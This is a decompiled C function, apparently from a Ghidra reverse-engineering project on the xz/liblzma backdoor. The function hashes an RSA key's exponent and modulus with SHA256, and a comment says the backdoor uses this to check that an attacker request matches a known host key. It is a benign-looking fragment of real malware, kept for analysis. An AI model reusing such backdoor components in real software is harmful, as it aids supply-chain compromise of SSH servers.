// /home/kali/xzre-ghidra/xzregh/107510_rsa_key_hash.c
// Function: rsa_key_hash @ 0x107510
// Calling convention: __stdcall
// Prototype: BOOL __stdcall rsa_key_hash(RSA * rsa, u8 * mdBuf, u64 mdBufSize, imported_funcs_t * funcs)
/*
 * AutoDoc: Serialises the RSA exponent and modulus and hashes them with SHA256 using the resolved imports. The monitor hooks rely on that digest to confirm that an attacker request refers to a known host key before acting.
 */

#include "xzre_types.h"


BOOL rsa_key_hash(RSA *rsa,u8 *mdBuf,u64 mdBufSize,imported_funcs_t *funcs)

{
  BOOL result_2;
  BOOL result;
  BOOL result_1;
  long lVar1;
  u8 *puVar2;
  u64 expSize;
  BIGNUM *e;
  BIGNUM *n;
  u8 local_1042 [4114];
  u64 written;
  
  puVar2 = local_1042 + 0x10;
  for (lVar1 = 0xffa; lVar1 != 0; lVar1 = lVar1 + -1) {
    *puVar2 = '\0';
    puVar2 = puVar2 + 1;
  }
  local_1042[0] = '\0';
  local_1042[1] = '\0';
  local_1042[2] = '\0';
  local_1042[3] = '\0';
  local_1042[4] = '\0';
  local_1042[5] = '\0';
  local_1042[6] = '\0';
  local_1042[7] = '\0';
  local_1042[8] = '\0';
  local_1042[9] = '\0';
  local_1042[10] = '\0';
  local_1042[0xb] = '\0';
  local_1042[0xc] = '\0';
  local_1042[0xd] = '\0';
  local_1042[0xe] = '\0';
  local_1042[0xf] = '\0';
  expSize = 0;
  if (((funcs != (imported_funcs_t *)0x0) && (rsa != (RSA *)0x0)) &&
     (funcs->RSA_get0_key != (pfn_RSA_get0_key_t)0x0)) {
    e = (BIGNUM *)0x0;
    n = (BIGNUM *)0x0;
    (*funcs->RSA_get0_key)(rsa,&n,&e,(BIGNUM **)0x0);
    if ((e != (BIGNUM *)0x0) && (n != (BIGNUM *)0x0)) {
      result_2 = bignum_serialize(local_1042,0x100a,&expSize,e,funcs);
      written = expSize;
      if (((result_2 != 0) &&
          ((expSize < 0x100a &&
           (result = bignum_serialize(local_1042 + expSize,0x100a - expSize,&expSize,n,funcs),
           result != 0)))) && (written + expSize < 0x100b)) {
        result_1 = sha256(local_1042,written + expSize,mdBuf,mdBufSize,funcs);
        return result_1;
      }
    }
  }
  return 0;
}

